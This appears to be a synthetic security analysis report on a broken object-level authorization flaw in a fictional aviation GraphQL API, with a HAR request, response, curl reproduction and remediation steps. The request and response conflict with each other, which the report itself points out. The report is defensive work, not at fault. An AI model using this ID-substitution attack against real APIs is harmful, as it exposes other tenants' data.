# Security Analysis Report
**System:** AeroOps Flight Management
**Domain:** Aviation / Flight Operations
**Example ID:** GQL-0287
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.1 | ID in path without ownership check on `updateResource` — attacker reads aviation flight management records via mutation ID substitution |

---

## Finding 1 — BOLA: ID Without Ownership Check via Mutation (Pattern 1.1)

### Summary
The GraphQL API at `https://api.aeroops-flight-manag.example.com/graphql` exposes an `updateResource` mutation whose `id` parameter is not validated against the authenticated user's ownership. Per §5.0 Pattern 1.1, an attacker substitutes `R-2287` for a victim's resource ID, and the server returns flight management data for `other-user-a412b86d` under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2287", input: {status: "approved", ownerId: "attacker-a412b86d"})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-a412b86d` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 1.1 — ID in path without ownership check (BOLA)
**Affected endpoint:** `POST https://api.aeroops-flight-manag.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.aeroops-flight-manag.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2287\", input: {status: \"approved\", ownerId: \"attacker-a412b86d\"}) { resourceId status } }"}
```

**Response — Victim Aviation Flight Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-b86d",
      "ownerId": "other-user-a412b86d",
      "data": {
        "sensitiveField": "CONFIDENTIAL-a412b86d",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.aeroops-flight-manag.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2287\", input: {status: \"approved\", ownerId: \"attacker-a412b86d\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-b86d, sensitiveField: CONFIDENTIAL-a412b86d
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before executing mutation or returning data.
2. Remove `ownerId` and `tenantId` from writable mutation inputs.
3. Redis cache key must include tenant dimension.
